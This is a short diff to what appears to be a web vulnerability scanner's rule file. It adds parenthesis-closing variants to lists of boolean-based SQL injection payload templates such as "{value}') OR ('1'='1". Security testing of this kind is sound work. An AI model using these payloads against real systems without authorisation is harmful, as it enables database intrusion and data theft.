@@ -114,6 +114,9 @@ SQLI_RULES: list[dict] = [
                 "{value} AND 1=1",
                 "{value}' AND '1'='1",
                 '{value}" AND "1"="1"',
+                "{value}) AND (1=1",
+                "{value}') AND ('1'='1",
+                '{value}") AND ("1"="1',
             ],
             "and_false": [
                 "{value} AND 1=2 -- ",
@@ -122,6 +125,9 @@ SQLI_RULES: list[dict] = [
                 "{value} AND 1=2",
                 "{value}' AND '1'='2",
                 '{value}" AND "1"="2"',
+                "{value}) AND (1=2",
+                "{value}') AND ('1'='2",
+                '{value}") AND ("1"="2',
             ],
             "or_true": [
                 "{value} OR 1=1 -- ",
@@ -130,6 +136,9 @@ SQLI_RULES: list[dict] = [
                 "{value} OR 1=1",
                 "{value}' OR '1'='1",
                 '{value}" OR "1"="1"',
+                "{value}) OR (1=1",
+                "{value}') OR ('1'='1",
+                '{value}") OR ("1"="1',
             ],
             "or_false": [
                 "{value} OR 1=2 -- ",
@@ -138,6 +147,9 @@ SQLI_RULES: list[dict] = [
                 "{value} OR 1=2",
                 "{value}' OR '1'='2",
                 '{value}" OR "1"="2"',
+                "{value}) OR (1=2",
+                "{value}') OR ('1'='2",
+                '{value}") OR ("1"="2',
             ],
             "control": [
                 "{value}XYZABCDEFGHIJ",
